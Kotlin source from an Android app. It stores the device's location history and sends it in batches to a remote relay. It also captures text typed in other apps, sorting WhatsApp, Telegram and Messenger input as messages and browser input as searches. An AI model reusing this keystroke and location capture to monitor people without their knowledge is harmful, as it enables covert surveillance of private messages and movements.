package com.phonehand.app

import android.content.Context
import android.os.Handler
import android.os.Looper
import org.json.JSONArray
import org.json.JSONObject
import java.util.concurrent.ConcurrentLinkedDeque

object LocationStore {
    data class Entry(
        val lat: Double,
        val lng: Double,
        val accuracy: Float,
        val at: Long,
        val stale: Boolean = false,
    )

    private const val PREFS = "location_store"
    private const val KEY_ITEMS = "items"
    private const val MAX_ITEMS = 1500

    private val pending = ConcurrentLinkedDeque<Entry>()
    private val lock = Any()

    fun add(context: Context, lat: Double, lng: Double, accuracy: Float, at: Long, stale: Boolean = false) {
        val entry = Entry(lat, lng, accuracy, at, stale)
        synchronized(lock) {
            val prefs = context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            val arr = JSONArray(prefs.getString(KEY_ITEMS, "[]"))
            arr.put(
                JSONObject()
                    .put("lat", lat)
                    .put("lng", lng)
                    .put("accuracy", accuracy.toDouble())
                    .put("at", at)
                    .put("stale", stale),
            )
            while (arr.length() > MAX_ITEMS) arr.remove(0)
            prefs.edit().putString(KEY_ITEMS, arr.toString()).apply()
        }
        pending.addLast(entry)
    }

    fun latest(context: Context): Entry? =
        load(context, 1).firstOrNull()

    fun load(context: Context, limit: Int = 200, fromMs: Long = 0L, toMs: Long = Long.MAX_VALUE): List<Entry> {
        synchronized(lock) {
            val arr = JSONArray(
                context.applicationContext.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                    .getString(KEY_ITEMS, "[]"),
            )
            return (0 until arr.length()).mapNotNull { i ->
                val o = arr.optJSONObject(i) ?: return@mapNotNull null
                val at = o.optLong("at")
                if (at < fromMs || at > toMs) return@mapNotNull null
                Entry(
                    lat = o.optDouble("lat"),
                    lng = o.optDouble("lng"),
                    accuracy = o.optDouble("accuracy").toFloat(),
                    at = at,
                    stale = o.optBoolean("stale", false),
                )
            }.sortedByDescending { it.at }.take(limit)
        }
    }

    fun flush(context: Context, maxBatch: Int = 10): Int {
        val batch = mutableListOf<Entry>()
        while (batch.size < maxBatch) {
            batch.add(pending.pollFirst() ?: break)
        }
        if (batch.isEmpty()) return 0
        val client = RelayHub.client ?: run {
            batch.forEach { pending.addFirst(it) }
            return 0
        }
        val items = JSONArray()
        batch.forEach { e ->
            items.put(
                JSONObject()
                    .put("lat", e.lat)
                    .put("lng", e.lng)
                    .put("accuracy", e.accuracy.toDouble())
                    .put("at", e.at)
                    .put("stale", e.stale),
            )
        }
        client.sendJson(JSONObject().put("type", "location_history").put("items", items))
        return batch.size
    }
}

object TypingSessionBuffer {
    private data class Session(
        val pkg: String,
        val app: String,
        val fieldKey: String,
        var text: StringBuilder,
        var startedAt: Long,
        var lastAt: Long,
        var action: String,
    )

    private var active: Session? = null
    private val handler = Handler(Looper.getMainLooper())
    private var flushRunnable: Runnable? = null

    private val SEARCH_PACKAGES = setOf(
        "com.google.android.googlequicksearchbox",
        "com.android.chrome",
        "com.sec.android.app.sbrowser",
    )

    fun onTyping(context: Context, pkg: String, app: String, fieldKey: String, added: String) {
        val now = System.currentTimeMillis()
        val action = when {
            SEARCH_PACKAGES.any { pkg.contains(it, ignoreCase = true) } -> "search"
            pkg.contains("whatsapp", ignoreCase = true) ||
                pkg.contains("telegram", ignoreCase = true) ||
                pkg.contains("messenger", ignoreCase = true) ||
                pkg.contains("messaging", ignoreCase = true) -> "message"
            else -> "typed"
        }
        val cur = active
        if (cur != null &&
            cur.fieldKey == fieldKey &&
            cur.pkg == pkg &&
            now - cur.lastAt < 4_000
        ) {
            cur.text.append(added)
            cur.lastAt = now
        } else {
            flush(context)
            active = Session(pkg, app, fieldKey, StringBuilder(added), now, now, action)
        }
        scheduleFlush(context)
    }

    private fun scheduleFlush(context: Context) {
        flushRunnable?.let { handler.removeCallbacks(it) }
        val r = Runnable { flush(context.applicationContext) }
        flushRunnable = r
        handler.postDelayed(r, 3_500)
    }

    fun flush(context: Context) {
        flushRunnable?.let { handler.removeCallbacks(it) }
        flushRunnable = null
        val s = active ?: return
        active = null
        val text = s.text.toString().trim()
        if (text.length < 2) return
        val contextLabel = when (s.action) {
            "search" -> "Searched in ${s.app}"
            "message" -> "Typed in ${s.app}"
            else -> "Typed in ${s.app}"
        }
        ActivityStore.add(context, "typing", s.app, "", text.take(240), s.lastAt)
        NotesStore.appendGrouped(context, text, "keyboard", s.pkg, s.action, contextLabel, s.startedAt)
        NotesStore.flush(context)
    }
}
